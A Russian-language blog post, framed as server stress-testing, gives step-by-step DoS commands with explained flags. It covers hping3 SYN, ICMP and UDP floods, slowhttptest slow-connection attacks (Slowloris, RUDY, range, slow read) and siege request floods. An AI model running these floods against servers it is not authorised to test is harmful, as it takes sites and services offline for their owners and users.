<article id="post-3903" class="post-3903 post type-post status-publish format-standard hentry category-security tag-ddos tag-dos tag-hping tag-siege tag-slowhttptest">

## DoS и DDoS атаки на Web сервера. Стресс-тестирование
<p>Сегодня мы рассмотрим варианты нагрузочного стресс-тестирования серверов и имитацию <strong>DoS</strong> (или <strong>DDoS</strong>, если тестировать с нескольких серверов) для <strong>Web</strong> серверов. Для чего это может быть полезно: для проверки собственных серверов и хостинг-провайдеров на данные типы уязвимостей.<br>
<strong>DoS</strong> атаки будем использовать <strong>L3/4</strong> и <strong>L7</strong> уровней <strong>OSI</strong>.</p>
<p><strong>dstIP</strong> — это <strong>IP</strong> адрес или <strong>FQDN</strong> имя атакуемой машины.</p>
<p>Первой будет утилита <strong>hping</strong> версии 3.<br>
Начнем с атаки на превышение максимального количества полуоткрытых сессий (<strong>SYN-flood</strong>):</p>
<p><code>hping3 --flood -S -p 80 192.168.232.7</code></p>
<p>используемые параметры:<br>
<strong>—flood</strong> — отправлять столько пакетов, сколько возможно.<br>
<strong>-S</strong> — использовать <strong>SYN</strong> пакеты<br>
<strong>-p 80</strong> — пакеты отправляются на порт 80 (<strong>HTTP</strong>).<br>
<span id="more-3903"></span><br>
Вторым типом атаки будет <strong>ICMP-flood</strong>. Его лучше использовать вместе с большим размером пакетов, чтобы попробовать исчерпать входящий канал атакуемого сервера.</p>
<p><code>hping3 --flood --icmp -d 1000 dstIP</code></p>
<p>используемые параметры:<br>
<strong>—icmp</strong> — используем пакеты ICMP<br>
<strong>-d 1000</strong> — указываем размер пакета</p>
<p>Теперь попробуем <strong>UDP-flood</strong>. Эта атака так же насыщает полосу пропускания.</p>
<p><code>hping3 --flood --udp -s 53 --keep -p 68 192.168.232.36</code></p>
<p>используемые параметры:<br>
<strong>—udp</strong> — используем <strong>UDP</strong><br>
<strong>-s 53</strong> — отправляем с порта 53<br>
<strong>—keep</strong> — фиксируем порт отправления, иначе он будет увеличиваться на 1 для каждого следующего пакета<br>
<strong>-p 68</strong> — отправляем пакеты на порт 68</p>
<p>Теперь перейдем к атакам непосредственно на сам <strong>Web</strong> сервер.<br>
Первой будет атака на медленные подключения. Смысл данной атаки в том, что у любого <strong>Web</strong> сервера есть лимит на количество одновременных подключений, но когда мы подключаемся и очень медленно запрашиваем страницу — соединение не сбрасывается, а количество параллельных подключений у сервера ограниченно.</p>
<p><code>slowhttptest -c 1000 -H -i 20 -r 200 -t GET -u http://dstIP -x 24 -p 3</code></p>
<p>используемые параметры:<br>
<strong>-c</strong> — общее суммарное количество подключений<br>
<strong>-i</strong> — пауза между сессиями для загрузкой части страницы (в рамках одного подключения)<br>
<strong>-r</strong> — количество подключений в секунду<br>
<strong>-t GET</strong> — использовать <strong>GET</strong> запросы (так же можно <strong>POST</strong>)<br>
<strong>-u</strong> — <strong>URL</strong>. Поддерживает <strong>HTTP</strong> и <strong>HTTPS</strong> ссылки<br>
<strong>-x</strong> — количество загружаемых байт из части страницы за одну сессию (в рамках одного подключения)<br>
<strong>-p</strong> — время ожидания при проверке подключения. Если ответ от сервера не получен за это время, то сервер считается недоступным<br>
<strong>-H</strong> — атака <strong>slow headers</strong> a.k.a. <strong>Slowloris</strong><br>
Так же доступные типы атак:<br>
<strong>-B</strong> — атака <strong>slow body</strong> a.k.a <strong>R-U-Dead-Yet</strong><br>
<strong>-R</strong> — атака <strong>range attack</strong> a.k.a <strong>Apache killer</strong><br>
<strong>-X</strong> — атака <strong>Slow Read</strong></p>
<p>И последний тип рассматриваемых атак. Утилита <strong>siege</strong>, которая просто запрашивает, в огромное количество потоков, страницы сайта, после чего происходит исчерпание либо ресурсов сервера (если запрашиваем тяжелые станицы) либо ресурсов исходящего канала (если запрашиваем тяжелые файлы).</p>
<p><code>siege -i -c 2000 https://dstIP/page</code></p>
<p>используемые параметры:<br>
<strong>-i</strong> — симулировать обычного пользователя<br>
<strong>-c</strong> — количество подключений<br>
<strong>page</strong> — запрашиваемая страницы. тип атаки зависит от выбранной страницы.<br>
Так же можно данной утилите передать флагом <strong>-R</strong> файл с перечислением страниц</p>
<p>Вот мы и рассмотрели набор для стресс-тестирования <strong>Web</strong> серверов. Более подробные параметры каждой из утилит можно посмотреть в <strong>Man’е</strong>.<span id="c7926_2_1" class="sam-pro-container sam-pro-place"></span></p>



	</div><!-- .entry-content -->
	
	</article>